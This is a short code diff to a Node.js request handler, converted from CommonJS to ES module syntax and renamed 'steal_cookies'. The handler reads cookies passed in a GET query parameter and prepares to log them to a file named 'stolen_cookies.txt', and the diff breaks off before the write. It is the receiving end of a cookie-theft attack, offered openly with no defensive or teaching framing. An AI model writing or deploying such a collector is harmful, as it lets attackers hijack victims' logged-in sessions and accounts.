@@ -1,7 +1,7 @@
-const fs = require('fs');
-const path = require('path');
+import fs from 'fs';
+import path from 'path';
 
-module.exports = (req, res) => {
+export const steal_cookies = (req, res) => {
     if (req.method === 'GET') {
         const cookies = req.query.cookies || 'No cookies';
         const logFile = path.join(__dirname, 'stolen_cookies.txt');
